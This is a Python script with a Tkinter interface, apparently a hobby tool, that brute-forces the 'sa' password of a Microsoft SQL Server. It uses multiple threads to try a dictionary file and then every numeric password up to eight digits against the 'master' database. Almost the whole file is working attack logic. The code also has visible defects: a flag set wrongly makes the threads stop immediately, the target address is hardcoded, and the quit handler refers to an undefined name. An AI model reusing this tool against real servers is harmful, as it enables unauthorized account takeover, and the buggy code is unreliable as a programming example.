#!/usr/bin/evn python
#-*- coding:utf-8 -*-
'''
Created on 2018年11月19日

@author: jinfeng
'''


from threading import Thread
import time
import os
import pymssql
import tkinter as tk  
from tkinter import ttk  
from tkinter import scrolledtext  
from tkinter import Menu  
from tkinter import Spinbox  
from tkinter import messagebox as mBox
from tkinter.filedialog  import asksaveasfilename 
from tkinter.filedialog import askopenfilename


def cracker(server,pswd_list,no):
    global tag
    
    print(u"No.%s号线程已开始运行，对%d个常用密码进行测试 !" % (no,len(pswd_list)))
    for pswd in pswd_list:
        if not tag:
            try:
                conn=pymssql.connect(server,'sa',str(pswd),database='master')
                print(u"No.%s号线程运行结束 !\n 服务器%s 账号sa的密码为 ：  %s\n" % (no,server,pswd))
                tag = True
                conn.close()
                break
            except:
                continue
        else:
            break
    
    #print(u"No.%s号线程运行结束 !" % no)
        
    
def get_pwlist():
    pwlist = []
    with open('passwddic.txt','r') as f:
        for line in f.readlines():
            password = line.strip('\n')
            pwlist.append(password)
    return pwlist


    
class CRACKER(object):
    def __init__(self):
        self.windows = tk.Tk()
        self.windows.geometry('350x300')
        self.windows.resizable(False, False)
        self.windows.title("MSSQL密码破解 ")
        self.label_ip = ttk.Label(self.windows,text=u'服务器地址：')
        self.label_ip.grid(row=0,column=0, padx=6,pady=5,sticky=tk.W)
        self.vartext_ip = tk.StringVar()
        self.entry_ip = tk.Entry(self.windows,width=15,textvariable=self.vartext_ip)
        self.entry_ip.grid(row=0,column=1,padx=6,pady=5, sticky=tk.W)
        self.button = tk.Button(self.windows,width=6,text="测试密码",command=self.main_cracker)
        self.button.grid(row=0,column=2,rowspan=2, sticky=tk.W)
        self.label_user = ttk.Label(self.windows,text=u'账号：')
        self.label_user.grid(row=1,column=0, padx=6,pady=5,sticky=tk.W)
        self.vartext_user = tk.StringVar()
        self.entry_user = tk.Entry(self.windows,width=15,textvariable=self.vartext_user)
        self.entry_user.grid(row=1,column=1,padx=6,pady=5, sticky=tk.W)
        self.scr = scrolledtext.ScrolledText(self.windows, width=30, height=10, wrap=tk.WORD)  
        self.scr.grid(column=0, row=2, padx=6,pady=5,sticky='WE', columnspan=3) 
    
        self.windows.mainloop()
    
    def _quit(self):  
        windows.quit()  
        windows.destroy()  
        exit()  
        
    def msg_datecheck(self):
        mBox.showwarning("title","text")
        
    def main_cracker(self):
        global tag
        tag = True
        server = '127.0.0.1'
        num_thread = 10
        time_start = time.time()
        pwlist = get_pwlist()
        step = len(pwlist)//num_thread+1  
        for n in range(num_thread):
            t1 = Thread(target = cracker,args = (server,pwlist[step*n:step*n+step],str(n+1),))
            t1.start()
        t1.join()
    
        if not tag:
            print(u'密码字典测试完毕，未找到匹配密码，将遍历测试8位以内所有数字密码！')
            for m in range(10):
                t2 = Thread(target = cracker,args = (server,range(m*10000000,(m+1)*10000000),str(m+1)+'+',))
                t2.start()
            t2.join()
            time_end = time.time()
            time_use = time_end - time_start
            print(u'用时 %d时%d分%d秒' % (time_use//3600,time_use%3600//60,time_use%60))
        


    
    
if __name__ == "__main__":
    CRACKER()

